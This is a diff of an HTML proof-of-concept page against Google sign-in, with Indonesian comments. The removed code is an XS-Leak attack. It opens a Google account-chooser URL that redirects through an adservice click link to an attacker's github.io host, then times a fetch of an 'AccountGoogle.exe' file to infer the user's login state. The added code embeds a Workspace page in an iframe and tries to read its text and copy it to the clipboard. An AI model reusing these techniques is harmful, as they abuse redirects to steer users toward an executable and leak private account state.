@@ -1,109 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Advanced XS-Leak PoC - Google OAuth Flow</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background-color: #f0f0f0;
-      padding: 40px;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      background-color: #4285F4;
-      color: #fff;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
-    button:hover {
-      background-color: #357ae8;
-    }
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-      white-space: pre-wrap;
-      text-align: left;
-      max-width: 600px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Auto Copy Iframe</title>
 </head>
+
 <body>
 
-  <h1>Advanced XS-Leak PoC - Google OAuth Flow</h1>
-  <p>This PoC infers user login status via the timing of the OAuth popup and resource probing.</p>
-  <button id="start-btn">Start XS-Leak Flow</button>
-  <div id="result">Result: Waiting...</div>
-  
+  <iframe
+    id="targetFrame"
+    src="http://access.workspace.google.com/u/0/ServiceNotAllowed?application=216932279217&source=scrip&continue=https://chat.google.com/?authuser%3D1&pli=1"
+    width="1000"
+    height="1000">
+  </iframe>
+
   <script>
-    const startBtn = document.getElementById('start-btn');
-    const resultDiv = document.getElementById('result');
+    const iframe = document.getElementById("targetFrame");
 
-    function openOAuthPopup() {
-      // Menggunakan URL yang lo minta:
-      const googleLoginURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2Fpoc.pdf%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0";
-      const popupWidth = 500, popupHeight = 600;
-      const left = (screen.width - popupWidth) / 2;
-      const top = (screen.height - popupHeight) / 2;
-      return window.open(googleLoginURL, 'GoogleLoginPopup', `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
-    }
-
-    async function probeFileCached() {
-      const probeUrl = "https://lanaya113505.github.io/pizza/AccountGoogle.exe";
-      const probeStart = performance.now();
+    iframe.addEventListener("load", async () => {
       try {
-        // Gunakan HEAD request untuk menghindari download penuh
-        await fetch(probeUrl, { method: 'HEAD', mode: 'no-cors' });
-        const probeTime = performance.now() - probeStart;
-        console.log("Probe time: " + probeTime.toFixed(2) + "ms");
-        if (probeTime < 300) {
-          resultDiv.innerHTML += "\nXS-Leak Probe: File likely cached (download triggered).";
-        } else {
-          resultDiv.innerHTML += "\nXS-Leak Probe: File not cached (download may not have been triggered).";
-        }
-      } catch (err) {
-        console.error("Probe error:", err);
-        resultDiv.innerHTML += "\nXS-Leak Probe: Error probing resource.";
-      }
-    }
+        // Ambil teks yang dirender di iframe
+        const text = iframe.contentDocument.body.innerText;
 
-    startBtn.addEventListener('click', () => {
-      resultDiv.innerHTML = "Result: Opening OAuth popup...";
-      const startTime = performance.now();
-      const popup = openOAuthPopup();
-      
-      if (!popup) {
-        resultDiv.innerHTML = "Popup blocked! Please allow popups for this site.";
-        return;
+        // Copy otomatis
+        await navigator.clipboard.writeText(text);
+
+        console.log("Auto-copy berhasil");
+      } catch (error) {
+        console.error("Auto-copy gagal:", error);
       }
-      
-      const timer = setInterval(() => {
-        try {
-          if (popup.closed) {
-            clearInterval(timer);
-            const elapsed = performance.now() - startTime;
-            resultDiv.innerHTML += `\nPopup closed after ${elapsed.toFixed(2)} ms`;
-            
-            if (elapsed < 4000) {
-              resultDiv.innerHTML += "\nInference: User likely logged in and triggered download.";
-            } else {
-              resultDiv.innerHTML += "\nInference: User interaction delayed or not logged in.";
-            }
-            
-            probeFileCached();
-          }
-        } catch (e) {
-          console.error("Error checking popup state:", e);
-        }
-      }, 500);
     });
   </script>
 
